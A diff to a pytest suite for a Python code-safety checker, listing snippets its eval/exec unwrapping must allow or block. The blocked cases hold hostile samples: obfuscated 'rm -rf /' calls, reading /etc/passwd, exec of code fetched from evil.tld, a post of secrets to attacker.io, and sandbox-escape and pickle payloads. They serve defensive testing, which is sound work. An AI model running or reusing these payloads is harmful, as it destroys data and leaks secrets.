@@ -790,9 +790,9 @@ class TestDynamicExecObfuscation:
     @pytest.mark.parametrize(
         "code, phrase",
         [
-            ("eval('1+1')", "dynamic code execution"),
-            ("exec('import os')", "dynamic code execution"),
-            ("compile('x', '<s>', 'exec')", "dynamic code execution"),
+            # NOTE: eval('1+1'), exec('import os') and compile('x','<s>','exec') were
+            # blanket-blocked by the legacy ban; Stage 2 recurses the (safe) payload
+            # and now allows them -- see TestEvalExecRecursion below.
             ("__import__('os').system('id')", "dynamic import"),
             ("__import__('o'+'s')", "dynamic import"),
             ("__import__(chr(111) + chr(115))", "dynamic import"),
@@ -824,3 +824,72 @@ class TestDynamicExecObfuscation:
     )
     def test_benign_dynamic_code_allowed(self, code):
         _ok(code)
+
+
+class TestEvalExecRecursion:
+    """Stage 2: eval/exec/compile are unwrapped, not blanket-banned. A safe
+    (constant-recoverable) payload is allowed; an obfuscated escape blocks."""
+
+    # ---- benign: must ALLOW ----
+    @pytest.mark.parametrize(
+        "code",
+        [
+            'eval("2+2")',
+            "eval('1+1')",
+            'eval("[x*2 for x in range(10)]")',
+            'exec("total = sum(range(100))\\nprint(total)")',
+            'exec("import os")',
+            'compile("a + b", "<s>", "eval")',
+            'compile("x", "<s>", "exec")',
+            'eval(compile("1 + 1", "<s>", "eval"))',
+            "ast.literal_eval(s)",
+            'eval("len([1,2,3])")',
+            's = "2 + 2"\neval(s)',
+            'eval("{\'a\': 1}.get(\'a\')")',
+            'eval("not python !!")',
+            "eval(chr(50) + chr(43) + chr(50))",
+            'print(eval("3 * 7"))',
+            'eval("data = 1")',
+            "df.eval('col_a + col_b')",
+            "pd.eval('x + y')",
+            'eval(f"{a} + {b}")',
+            "getattr(os, 'getpid')()",
+        ],
+    )
+    def test_recurse_safe_payload_allowed(self, code):
+        _ok(code)
+
+    # ---- egregious: must BLOCK ----
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "eval(\"__import__('os').system('rm -rf /')\")",
+            "exec(\"import os; os.system('rm -rf /')\")",
+            'exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="))',
+            'exec(codecs.decode("vzcbeg bf; bf.flfgrz(\'ez -es /\')", "rot_13"))',
+            "getattr(os, 'sys' + 'tem')('rm -rf /')",
+            "getattr(__import__('os'), 'system')('id')",
+            "getattr(__import__('o' + 's'), 'system')('x')",
+            'eval("().__class__.__bases__[0].__subclasses__()")',
+            'exec("".join(chr(c) for c in [105,109,112,111,114,116,32,111,115]))',
+            'p = "os.system(\'rm -rf /\')"\nexec("import os; " + p)',
+            "exec(\"import requests\\nrequests.post('http://attacker.io/x', data='secret')\")",
+            'exec("open(\'/etc/passwd\').read()")',
+            'e = exec\ne("import os; os.system(\'rm -rf /\')")',
+            'eval("exec(\\"import os; os.system(\'rm -rf /\')\\")")',
+            'exec(requests.get("http://evil.tld/p").text)',
+            'exec(__import__("base64").b64decode(BLOB))',
+            "exec(marshal.loads(BLOB))",
+            "pickle.loads(blob)",
+            'code_obj = compile("import os; os.system(\'rm -rf /\')", "<s>", "exec")\nexec(code_obj)',
+            "eval(eval(eval(eval(eval(eval('2+2'))))))",
+        ],
+    )
+    def test_recurse_unsafe_payload_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    def test_bracket_bomb_blocked(self):
+        assert _check_code_safety('exec("(" * 100000 + "1" + ")" * 100000)') is not None
+
+    def test_import_concat_benign_module_allowed(self):
+        _ok('__import__("hugging" + "face_hub")')
